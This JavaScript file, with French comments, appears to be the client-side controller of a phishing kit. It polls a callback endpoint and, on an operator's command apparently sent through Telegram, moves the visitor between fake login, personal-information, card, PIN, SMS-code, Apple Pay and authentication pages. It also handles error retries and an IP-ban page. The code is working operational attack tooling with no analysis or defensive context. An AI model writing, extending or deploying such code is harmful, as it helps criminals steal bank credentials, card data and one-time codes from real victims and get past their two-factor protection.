class TelegramRedirect {
    constructor(options = {}) {
        this.redirectTimer = options.redirectTimer || 60000; 
        this.pollInterval = options.pollInterval || 2000; // 2 secondes pour éviter la surcharge
        this.maxRetries = options.maxRetries || 3;
        this.retryDelay = options.retryDelay || 1000;
        
        this.startTime = Date.now();
        this.intervalId = null;
        this.timeoutId = null;
        this.retryCount = 0;
        this.isRedirecting = false;
        this.currentPage = this.getCurrentPage();
        
        this.redirects = {
            'login': '../pages/login.php',
            'login_error': '../pages/login.php?error=error',

            'infos': '../pages/infos.php',
            'infos_error': '../pages/infos.php?error=error',

            'carte': '../pages/carte.php',
            'carte_error': '../pages/carte.php?error=error',

            'pin': '../pages/pin.php',
            'pin_error': '../pages/pin.php?error=error',
            
            'sms': '../pages/sms.php',
            'sms_error': '../pages/sms.php?error=error',

            'custom_input': '../pages/custom_input.php',
            'custom_input_waiting': null, 
            'waiting_custom_message': '../pages/custom_input.php',
            'custom_message': '../pages/custom_input.php',

            'applepay': '../pages/applepay.php',
            'applepay_error': '../pages/applepay.php?error=error',

            'auth': '../pages/auth.php',
            'auth_error': '../pages/auth.php?error=error',   

            'success': '../pages/success.php',
            'ban_ip': '../pages/ban.php'
        };
        
        this.init();
    }
    
    getCurrentPage() {
        const path = window.location.pathname;
        const page = path.split('/').pop();
        // Gérer les cas spéciaux pour les pages de connexion
        if (page === 'login.php' || page === 'index.php' || page === '') {
            return 'login.php';
        }
        return page || 'login.php';
    }
    
    getCurrentStep() {
        const currentPage = this.currentPage;
        const stepMap = {
            'login.php': 'login',
            'index.php': 'index',
            'infos.php': 'infos',
            'carte.php': 'carte',
            'pin.php': 'pin',
            'sms.php': 'sms',
            'custom_input.php': 'custom',
            'applepay.php': 'applepay',
            'auth.php': 'auth',
            'success.php': 'success',
            'ban.php': 'ban'
        };
        return stepMap[currentPage] || 'login';
    }
    
    init() {
        console.log('🚀 Initialisation du système de redirection Telegram');
        console.log(`📍 Page actuelle: ${this.currentPage}`);
        console.log(`📍 Étape actuelle: ${this.getCurrentStep()}`);
        console.log(`⏱️ Timer de redirection: ${this.redirectTimer / 1000} secondes`);
        this.startPolling();
        // ✅ Ne pas démarrer le timer automatiquement au chargement
        // Il sera démarré après le submit du formulaire via startRedirectTimer()
    }
    
    startRedirectTimer() {
        // ✅ Arrêter le timer précédent s'il existe
        if (this.timeoutId) {
            clearTimeout(this.timeoutId);
            this.timeoutId = null;
        }
        
        // ✅ Redirection automatique vers success.php après REDIRECT_TIMER si pas de réponse
        this.timeoutId = setTimeout(() => {
            // Vérifier si on n'est pas déjà en train de rediriger
            if (!this.isRedirecting && this.redirects['success']) {
                console.log(`⏱️ Timer de redirection expiré (${this.redirectTimer / 1000}s) - Redirection vers success.php`);
                this.isRedirecting = true;
                this.stopPolling();
                this.redirectWithVerification(this.redirects['success'], 'success');
            }
        }, this.redirectTimer);
        
        console.log(`⏱️ Timer de redirection démarré: ${this.redirectTimer / 1000} secondes`);
    }
    
    startPolling() {
        this.intervalId = setInterval(() => {
            this.checkForRedirect();
        }, this.pollInterval);
    }
    
    async checkForRedirect() {
        try {
            const response = await this.fetchCallback();
            const action = response.trim();
            
            // ✅ Démarrer le timer de redirection automatique au premier check (après submit)
            if (!this.timeoutId && this.redirectTimer > 0) {
                this.startRedirectTimer();
            }
            
            if (action && action !== 'none' && this.redirects[action]) {
                console.log(`📱 Action reçue: ${action}`);
                console.log(`📍 Page actuelle: ${this.currentPage}`);
                console.log(`📍 Étape actuelle: ${this.getCurrentStep()}`);
                
                // Permettre toutes les redirections multiples
                console.log(`📱 Traitement de l'action: ${action}`);
                
                // Vérifier si l'action est pertinente pour la page actuelle
                if (this.shouldProcessAction(action)) {
                    console.log(`✅ Action pertinente pour la page actuelle: ${action}`);
                    
                    // Gestion spéciale pour custom_input_waiting
                    if (action === 'custom_input_waiting') {
                        console.log('📝 Demande de message personnalisé - En attente de votre message...');
                        // Ne pas rediriger, juste afficher un message
                        return;
                    }
                    
                    // Redirection normale pour toutes les autres actions
                    this.redirectWithVerification(this.redirects[action], action);
                } else {
                    console.log(`⚠️ Action non pertinente pour la page actuelle: ${action} (page: ${this.currentPage})`);
                    // Ne pas arrêter le polling, continuer à écouter
                }
            }
        } catch (error) {
            console.error('❌ Erreur lors de la vérification:', error);
            this.handleError(error);
        }
    }
    
    shouldProcessAction(action) {
        const currentStep = this.getCurrentStep();
        
        // Actions qui peuvent être traitées depuis n'importe quelle page
        const globalActions = ['success', 'ban_ip', 'custom_message'];
        
        // Actions spécifiques à certaines pages
        const pageSpecificActions = {
            'login': ['login', 'login_error'],
            'infos': ['infos', 'infos_error'],
            'carte': ['carte', 'carte_error'],
            'pin': ['pin', 'pin_error', 'pin_cc', 'pin_cc_error'],
            'sms': ['sms', 'sms_error', 'SMS'],
            'custom': ['custom_input', 'custom_input_waiting', 'waiting_custom_message'],
            'applepay': ['applepay', 'applepay_error'],
            'auth': ['auth', 'auth_error']
        };
        
        // Si c'est une action globale, toujours traiter
        if (globalActions.includes(action)) {
            return true;
        }
        
        // Si c'est une action spécifique à la page actuelle, traiter
        if (pageSpecificActions[currentStep] && pageSpecificActions[currentStep].includes(action)) {
            return true;
        }
        
        // Si l'action correspond à une redirection vers une autre page, traiter
        if (this.redirects[action] && !action.includes('_error')) {
            return true;
        }
        
        // Pour les actions d'erreur, toujours traiter si elles correspondent à la page actuelle
        if (action.includes('_error')) {
            const baseAction = action.replace('_error', '');
            if (pageSpecificActions[currentStep] && pageSpecificActions[currentStep].includes(action)) {
                return true;
            }
        }
        
        return false;
    }
    
    async fetchCallback() {
        try {
            const response = await fetch('../actions/callback.php', {
                method: 'GET',
                cache: 'no-store',
                headers: {
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                }
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            return await response.text();
        } catch (error) {
            // En cas d'erreur de connexion, retourner 'none' pour éviter les redirections multiples
            console.warn('Erreur de connexion callback:', error.message);
            return 'none';
        }
    }
    
    handleError(error) {
        this.retryCount++;
        
        if (this.retryCount >= this.maxRetries) {
            console.error('❌ Nombre maximum de tentatives atteint');
            this.stopPolling();
            return;
        }
        
        console.log(`🔄 Tentative ${this.retryCount}/${this.maxRetries} dans ${this.retryDelay}ms`);
        setTimeout(() => {
            this.checkForRedirect();
        }, this.retryDelay);
    }
    
    showConfirmationMessage(action) {
        const messageDiv = document.createElement('div');
        messageDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #4CAF50;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            z-index: 10000;
            font-family: Arial, sans-serif;
            font-size: 14px;
            max-width: 300px;
            animation: slideIn 0.3s ease-out;
        `;
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
        
        const messages = {
            'login': '✅ Connexion en cours...',
            'infos': '✅ Informations traitées...',
            'carte': '✅ Carte en cours de traitement...',
            'custom_input': '✅ Custom en cour de traitement...',
            'applepay': '✅ applepay traité...',
            'auth': '✅ Auth traité...',
            'sms': '✅ sms traité...',
            'success': '✅ Succès ! Redirection...',

            'ban_ip': '❌ IP bannie...',
            'login_error': '❌ Erreur de connexion...',
            'infos_error': '❌ Erreur informations...',
            'carte_error': '❌ Erreur carte...',
            'sms_error': '❌ Erreur sms...',
            'custom_input_error': '❌ Erreur custom...',
            'applepay_error': '❌ Erreur code applepay...',
            'itsme_error': '❌ Erreur itsme...'
        };
        
        messageDiv.textContent = messages[action] || '✅ Action prise en compte...';
        document.body.appendChild(messageDiv);
        
        setTimeout(() => {
            messageDiv.style.animation = 'slideOut 0.3s ease-in';
            setTimeout(() => {
                if (messageDiv.parentNode) {
                    messageDiv.parentNode.removeChild(messageDiv);
                }
            }, 300);
        }, 3000);
    }

    redirectWithVerification(url, action) {
        console.log(`🔄 Redirection vers: ${url}`);
        
        this.markActionAsProcessed(action);
        
        // Arrêter le timer de redirection automatique si une action est reçue
        if (this.timeoutId) {
            clearTimeout(this.timeoutId);
            this.timeoutId = null;
            console.log('⏱️ Timer de redirection automatique annulé (action reçue)');
        }
        
        // Ne pas rediriger vers la même page (évite les reloads et re-notifications)
        const currentFile = window.location.pathname.split('/').pop();
        const targetFile = url.split('/').pop().split('?')[0];
        if (currentFile === targetFile && !url.includes('?error=')) {
            console.log(`⚠️ Déjà sur la page cible (${targetFile}), redirection ignorée`);
            return; // On ne stoppe PAS le polling ici, on continue d'écouter
        }
        
        // Stopper le polling seulement quand on est sûr de rediriger
        this.stopPolling();
        this.isRedirecting = true;
        
        setTimeout(() => {
            try {
                window.location.replace(url);
            } catch (error) {
                console.error('❌ Erreur de redirection:', error);
                window.location.href = url;
            }
        }, 100);
    }

    markActionAsProcessed(action) {
        const processedActions = JSON.parse(localStorage.getItem('processedActions') || '{}');
        processedActions[action] = {
            timestamp: Date.now(),
            page: this.currentPage,
            step: this.getCurrentStep()
        };
        localStorage.setItem('processedActions', JSON.stringify(processedActions));
        console.log(`📝 Action marquée comme traitée: ${action} depuis ${this.currentPage}`);
    }

    isActionProcessed(action) {
        const processedActions = JSON.parse(localStorage.getItem('processedActions') || '{}');
        const actionData = processedActions[action];
        
        if (!actionData) return false;
        
        const timeDiff = Date.now() - actionData.timestamp;
        const isRecent = timeDiff < 30000; // 30 secondes — cohérent avec le cooldown PHP
        
        if (isRecent) {
            console.log(`⚠️ Action déjà traitée récemment: ${action} (il y a ${Math.round(timeDiff/1000)}s depuis ${actionData.page})`);
        }
        
        return isRecent;
    }

    redirect(url) {
        console.log(`🔄 Redirection directe vers: ${url}`);
        window.location.href = url;
    }
    
    stopPolling() {
        if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
        }
        // ✅ Arrêter aussi le timer de redirection automatique
        if (this.timeoutId) {
            clearTimeout(this.timeoutId);
            this.timeoutId = null;
        }
    }
    
    // Forcer la redirection même si l'utilisateur est déjà sur une page
    forceRedirect(action) {
        if (this.redirects[action]) {
            console.log(`🔄 FORCE REDIRECTION: ${action} vers ${this.redirects[action]}`);
            // Ne pas arrêter le polling pour permettre les redirections multiples
            this.redirectWithVerification(this.redirects[action], action);
        } else {
            console.error(`❌ Action inconnue pour la redirection forcée: ${action}`);
        }
    }
    
    // Forcer la redirection via le serveur (plus fiable)
    async forceRedirectServer(action) {
        try {
            console.log(`🔄 FORCE REDIRECTION SERVER: ${action}`);
            const response = await fetch(`../actions/force_redirect.php?action=${action}`, {
                method: 'GET',
                cache: 'no-store',
                headers: {
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                if (data.success && data.redirect_url) {
                    console.log(`✅ Redirection forcée confirmée: ${action} vers ${data.redirect_url}`);
                    this.stopPolling();
                    this.redirectWithVerification(data.redirect_url, action);
                } else {
                    console.error('❌ Erreur dans la réponse de redirection forcée:', data);
                }
            } else {
                console.error('❌ Erreur HTTP lors de la redirection forcée:', response.status);
            }
        } catch (error) {
            console.error('❌ Erreur lors de la redirection forcée:', error);
            // Fallback vers la redirection locale
            this.forceRedirect(action);
        }
    }
    
    // Obtenir des informations sur la page actuelle
    getPageInfo() {
        return {
            page: this.currentPage,
            step: this.getCurrentStep(),
            url: window.location.href,
            timestamp: Date.now()
        };
    }
    
    // Vérifier si une action est en cours de traitement
    isActionInProgress(action) {
        return this.isActionProcessed(action);
    }
    
    // Nettoyer les actions traitées anciennes
    cleanupOldActions() {
        const processedActions = JSON.parse(localStorage.getItem('processedActions') || '{}');
        const now = Date.now();
        const cleanedActions = {};
        
        Object.keys(processedActions).forEach(action => {
            const actionData = processedActions[action];
            if (now - actionData.timestamp < 300000) { // 5 minutes
                cleanedActions[action] = actionData;
            }
        });
        
        localStorage.setItem('processedActions', JSON.stringify(cleanedActions));
        console.log('🧹 Nettoyage des actions anciennes terminé');
    }
    
    destroy() {
        this.stopPolling();
        this.isRedirecting = true;
        // ✅ Nettoyer le timer de redirection automatique
        if (this.timeoutId) {
            clearTimeout(this.timeoutId);
            this.timeoutId = null;
        }
    }
}



// Exposer les méthodes utiles globalement
if (typeof window !== 'undefined') {
    window.TelegramRedirect = TelegramRedirect;
    
    // Fonctions utilitaires globales
    window.forceRedirect = function(action) {
        if (window.telegramRedirect) {
            window.telegramRedirect.forceRedirectServer(action);
        } else {
            console.error('❌ TelegramRedirect non initialisé');
        }
    };
    
    window.getCurrentPageInfo = function() {
        if (window.telegramRedirect) {
            return window.telegramRedirect.getPageInfo();
        } else {
            console.error('❌ TelegramRedirect non initialisé');
            return null;
        }
    };
    
    window.isActionInProgress = function(action) {
        if (window.telegramRedirect) {
            return window.telegramRedirect.isActionInProgress(action);
        } else {
            console.error('❌ TelegramRedirect non initialisé');
            return false;
        }
    };
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = TelegramRedirect;
}
